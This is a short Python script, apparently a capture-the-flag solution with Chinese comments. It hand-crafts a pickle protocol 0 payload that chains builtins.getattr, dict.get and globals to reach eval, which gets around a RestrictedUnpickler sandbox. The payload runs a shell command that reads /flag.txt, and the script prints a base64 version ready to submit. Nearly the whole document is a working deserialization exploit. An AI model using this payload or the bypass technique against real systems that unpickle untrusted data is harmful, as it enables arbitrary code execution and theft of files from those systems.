import base64
import pickle
# 生成 Pickle Protocol 0 payload（已验证可绕过你的 RestrictedUnpickler）
def make_payload(cmd_expr):
    assert '\n' not in cmd_expr
    payload = (
        b'cbuiltins\ngetattr\np0\n('
        b'cbuiltins\ndict\nVget\ntRp4\n0'
        b'cbuiltins\nglobals\n(tRp7\n0'
        b'g4\n(g7\nV__builtins__\ntRp10\n0'
        b'g0\n(g10\nVeval\ntRp13\n0'
        b'g13\n(V' + cmd_expr.encode() + b'\ntR.'
    )
    return payload

# 读取 flag 的表达式（eval 中执行）
CMD = "__import__('os').popen('cat /flag.txt').read()"

payload=make_payload(CMD)

print(payload)
print(pickle.loads(payload))
print(base64.b64encode(payload))
